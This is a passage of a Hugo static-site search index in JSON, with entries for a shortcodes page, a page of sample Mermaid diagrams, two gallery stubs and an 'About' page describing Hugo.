50%; top: 50%; margin-left: -36px; margin-top: -36px; position: absolute; cursor: pointer; }  ","description":"A brief description of Hugo Shortcodes","id":10,"section":"posts","tags":["shortcodes","privacy"],"title":"Rich Content","uri":"https://brp-rodriguez.github.io/es/posts/rich-content/"},{"content":"graph TD; A--\u0026gt;B; A--\u0026gt;E; A--\u0026gt;C; B--\u0026gt;D; C--\u0026gt;D; graph TD; planear--\u0026gt;ejecutas; ejecutas--\u0026gt;verificas; verificas--\u0026gt;haces; haces--\u0026gt;planear; sequenceDiagram participant Alice participant Bob Alice-\u0026gt;John: Hello John, how are you? loop Healthcheck John-\u0026gt;John: Fight against hypochondria end Note right of John: Rational thoughts \u0026lt;br/\u0026gt;prevail... John--\u0026gt;Alice: Great! John-\u0026gt;Bob: How about you? Bob--\u0026gt;John: Jolly good! graph TD A[Hard] --\u0026gt;|Text| B(Round) B --\u0026gt; C{Decision} C --\u0026gt;|One| D[Result 1] C --\u0026gt;|Two| E[Result 2] gantt section Section Completed :done, des1, 2014-01-06,2014-01-08 Active :active, des2, 2014-01-07, 3d Parallel 1 : des3, after des1, 1d Parallel 2 : des4, after des1, 1d Parallel 3 : des5, after des3, 1d Parallel 4 : des6, after des4, 1d classDiagram Class01 \u0026lt;|-- AveryLongClass : Cool \u0026lt;\u0026lt;interface\u0026gt;\u0026gt; Class01 Class09 --\u0026gt; C2 : Where am i? Class09 --* C3 Class09 --|\u0026gt; Class07 Class07 : equals() Class07 : Object[] elementData Class01 : size() Class01 : int chimp Class01 : int gorilla class Class10 { \u0026lt;\u0026lt;service\u0026gt;\u0026gt; int id size() } stateDiagram [*] --\u0026gt; Still Still --\u0026gt; [*] Still --\u0026gt; Moving Moving --\u0026gt; Still Moving --\u0026gt; Crash Crash --\u0026gt; [*] pie \u0026#34;Dogs\u0026#34; : 386 \u0026#34;Cats\u0026#34; : 85 \u0026#34;Rats\u0026#34; : 15 ","description":"Generate diagrams, charts, graphs or flows from markdown-like text via javascript.","id":11,"section":"posts","tags":["diagram"],"title":"Mermaid support","uri":"https://brp-rodriguez.github.io/es/posts/test-mermaid/"},{"content":"Sample images from Pixabay\n","description":"cartoon gallery","id":12,"section":"gallery","tags":null,"title":"Cartoon","uri":"https://brp-rodriguez.github.io/es/gallery/cartoon/"},{"content":"Sample images from Pixabay\n","description":"photo gallery","id":13,"section":"gallery","tags":null,"title":"Photo","uri":"https://brp-rodriguez.github.io/es/gallery/photo/"},{"content":"Written in Go, Hugo is an open source static site generator available under the Apache Licence 2.0. Hugo supports TOML, YAML and JSON data file types, Markdown and HTML content files and uses shortcodes to add rich content. Other notable features are taxonomies, multilingual mode, image processing, custom output formats, HTML/CSS/JS minification and support for Sass SCSS workflows.\nHugo makes use of a variety of open source projects including:\n https://github.com/russross/blackfriday https://github.com/alecthomas/chroma https://github.com/muesli/smartcrop https://github.com/spf13/cobra https://github.com/spf13/viper  Hugo is ideal for blogs, corporate websites, creative portfolios, online magazines, single page applications or even a website with thousands of pages.\nHugo is for people who want to hand code their own website without worrying about setting up complicated runtimes, dependencies and databases.\nWebsites built with Hugo are extremelly fast, secure and can be deployed anywhere including, AWS, GitHub Pages, Heroku, Netlify and any other hosting provider.\nLearn more and contribute on GitHub.\n","description":"Hugo, the world’s fastest framework for building websites","id":18,"section":"","tags":null,"title":"About","uri":"https://brp-rodriguez.github.io/es/about/"}]